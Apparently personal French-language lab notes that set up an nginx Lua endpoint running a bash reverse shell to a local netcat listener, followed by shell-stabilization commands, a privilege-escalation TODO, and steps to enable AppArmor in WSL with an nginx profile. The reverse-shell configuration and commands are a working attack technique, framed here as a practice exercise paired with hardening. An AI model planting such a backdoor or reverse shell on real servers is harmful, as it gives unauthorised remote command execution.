
sudo apt install libnginx-mod-http-lua netcat-traditional 
# spawn reverse shell: copier la conf nginx dans /etc/nginx/conf.d/reverse.conf puis reload le service
# sup
server {
    listen 8080;

    location /shell {
        allow 127.0.0.1; 
        deny all;
        content_by_lua_block {
            os.execute("setsid /bin/bash -c 'exec 3<>/dev/tcp/127.0.0.1/4445; script -qc \"bash -i\" /dev/null <&3 >&3 2>&3 &'")
            ngx.say("reverse shell spawned")
        }
    }
}   
# terminal 1: 
nc -lvnp 4445
# terminal 2: 
curl localhost:8080/shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Passer en background: ctrl+z
# Stabiliser le shell: 
stty raw -echo; fg

# TODO trouver le privilege escalation 

# Une fois trouvé, securisez avec apparmor
sudo aa-status >> affiche apparmor filesystem is not mounted.

# %UserProfile%\.wslconfig on Windows
[wsl2]
kernelCommandLine = lsm=apparmor,landlock,lockdown,yama,loadpin,safesetid,integrity,selinux,tomoyo   

# fstab on Linux
echo "none     /sys/kernel/security securityfs defaults            0      0" >> /etc/fstab

# Restart WSL
wsl --shutdown
# Activer la découverte réseau sur cmd
netsh advfirewall firewall set rule group="Network Discovery" new enable=Yes   

sudo aa-status >> affiche les profiles

#créer un profil pour nginx 
#configuration app armor à copîer dans  /etc/apparmor.d/nginx pour nginx: 

#include <tunables/global>

/usr/sbin/nginx {
#include <abstractions/base>
#include <abstractions/nameservice>
#include <abstractions/openssl>

capability dac_override,
capability dac_read_search,
capability net_bind_service,
capability setgid,
capability setuid,

/etc/nginx/** r,
/var/log/nginx/** w,
/var/www/** r,
/run/nginx.pid rw,

network inet stream,
network inet6 stream,

deny /etc/shadow r,
}   